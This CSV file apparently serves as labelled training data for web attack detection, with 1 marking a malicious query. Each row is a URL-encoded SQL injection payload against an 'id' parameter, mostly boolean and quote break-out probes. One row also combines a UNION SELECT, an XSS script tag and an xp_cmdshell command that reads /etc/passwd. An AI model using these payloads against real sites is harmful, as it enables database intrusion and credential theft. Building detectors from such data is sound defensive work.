query,label
/?id=1'%20order%20by%201--%20-,1
"/?id=1&nWWI=9241%20AND%201%3D1%20UNION%20ALL%20SELECT%201,NULL,'<script>alert(""XSS"")</script>',table_name%20FROM%20information_schema.tables%20WHERE%202>1--/**/;%20EXEC%20xp_cmdshell('cat%20../../../etc/passwd')%23",1
/?id=1'%20or%201=1--%20-,1
/?id=4489'%20and%201=0--%20-,1
"/?id=1())(("".)'.",1
"/?id=1'snCCjI<'"">PQOXnA",1
/?id=1)%20AND%204835%3D9562--%20egHS,1
/?id=1)%20AND%206595%3D8354%20AND%20(9323%3D9323,1
/?id=1))%20AND%206945%3D4321%20AND%20((1586%3D1586,1
/?id=1)))%20AND%202261%3D7216%20AND%20(((9254%3D9254,1
/?id=1%20AND%202443%3D5649,1
/?id=1%20AND%207593%3D3788--%20xkyv,1
/?id=1%20AND%201990%3D1737%23%20BMum,1
/?id=1)%20WHERE%207193%3D7193%20AND%203471%3D3382--%20ZKlC,1
/?id=1%20WHERE%201710%3D1710%20AND%209115%3D8129--%20ebbw,1
/?id=1%2B(SELECT%20HEum%20WHERE%203385%3D3385%20AND%207198%3D7869)%2B,1
/?id=1))%20AS%20PIsz%20WHERE%202980%3D2980%20AND%207911%3D3636--%20ipUC,1
/?id=1)%20AS%20vRPQ%20WHERE%208437%3D8437%20AND%201616%3D7065--%20VQTD,1
/?id=1`%20WHERE%202391%3D2391%20AND%209169%3D1675--%20kbcX,1
/?id=1`)%20WHERE%202144%3D2144%20AND%203786%3D6938--%20SeIA,1
/?id=1`%3D`1`%20AND%201154%3D5000%20AND%20`1`%3D`1,1
/?id=1]-(SELECT%200%20WHERE%205192%3D5192%20AND%205398%3D1322)|[1,1
/?id=1')%20AND%208069%3D3318--%20RfBB,1
/?id=1'%20AND%203074%3D2707--%20EynL,1
"/?id=1""%20AND%204029%3D1979--%20JEpV",1
/?id=1')%20AND%203731%3D9868%20AND%20('KntK'%3D'KntK,1
/?id=1'))%20AND%204874%3D6499%20AND%20(('udTs'%3D'udTs,1
/?id=1')))%20AND%208631%3D3684%20AND%20((('vkam'%3D'vkam,1
/?id=1'%20AND%208247%3D9484%20AND%20'EYOt'%3D'EYOt,1
/?id=1')%20AND%205510%3D2684%20AND%20('Vtdl'%20LIKE%20'Vtdl,1
/?id=1'))%20AND%203677%3D1868%20AND%20(('sJXm'%20LIKE%20'sJXm,1
/?id=1')))%20AND%202724%3D8703%20AND%20((('aIfY'%20LIKE%20'aIfY,1
/?id=1%25'%20AND%206442%3D5393%20AND%20'hGhV%25'%3D'hGhV,1
/?id=1'%20AND%209799%3D7444%20AND%20'Eqvy'%20LIKE%20'Eqvy,1
"/?id=1"")%20AND%203115%3D8243%20AND%20(""huyZ""%3D""huyZ",1
"/?id=1""))%20AND%206668%3D6822%20AND%20((""lhlc""%3D""lhlc",1
"/?id=1"")))%20AND%204163%3D7155%20AND%20(((""sIgm""%3D""sIgm",1
"/?id=1""%20AND%205077%3D9795%20AND%20""Eqae""%3D""Eqae",1
"/?id=1"")%20AND%201509%3D1599%20AND%20(""kSft""%20LIKE%20""kSft",1
"/?id=1""))%20AND%208751%3D6009%20AND%20((""wcvf""%20LIKE%20""wcvf",1
"/?id=1"")))%20AND%201111%3D8148%20AND%20(((""QyBz""%20LIKE%20""QyBz",1
"/?id=1""%20AND%208518%3D5272%20AND%20""smDr""%20LIKE%20""smDr",1
/?id=1'%20AND%209958%3D6345%20OR%20'yOXu'%3D'MZIM,1
/?id=1')%20WHERE%201264%3D1264%20AND%201865%3D5450--%20yHEz,1
"/?id=1"")%20WHERE%208849%3D8849%20AND%205967%3D3379--%20Xikr",1
